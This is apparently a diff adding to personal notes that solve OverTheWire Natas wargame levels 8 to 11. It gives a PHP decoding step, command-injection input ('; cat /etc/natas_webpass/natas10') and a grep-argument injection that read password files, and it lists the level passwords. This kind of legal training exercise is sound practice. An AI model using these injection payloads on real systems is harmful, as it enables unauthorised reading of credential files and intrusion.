@@ -63,6 +63,21 @@ Password:a6bZCNYwdKqN5cGP11ZdtPg0iImQQhAB
 8->9
 CTRL U 
 http://natas8.natas.labs.overthewire.org/index-source.html
+Into a php editer (e.g https://www.programiz.com/php/online-compiler/)
+reverse the functions i.e echo base64_decode(strrev(hex2bin('3d3d516343746d4d6d6c315669563362')));
+input: oubWYf2kBq into secret
+Password: Sda6t0vkOPkM8YeOZkAGVhFoaplvlJFd
+
+9->10
+'''note able to modify the key does not stop characters that could be taken as a command'''
+input: ; cat /etc/natas_webpass/natas10
+password: D44EcsFkLxPIkAAKLosx8z3hxX1Z4MCE
+
+10->11
+input: .* /etc/natas_webpass/natas11
+Password: 1KFqoJXi6hRaPluAmk8ESDW4fSysRoIg
+
+
 
 
 
